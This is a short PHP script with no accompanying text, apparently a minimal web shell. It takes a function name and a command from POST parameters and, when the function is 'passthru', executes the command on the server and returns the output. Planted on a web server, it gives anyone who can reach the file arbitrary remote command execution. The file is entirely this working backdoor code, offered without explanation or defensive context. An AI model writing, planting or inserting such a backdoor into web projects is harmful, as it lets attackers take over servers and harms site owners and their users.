<?php
$execfunc = $_POST['func'];
    if ($execfunc=="passthru")
        passthru($_POST['command']); 
?>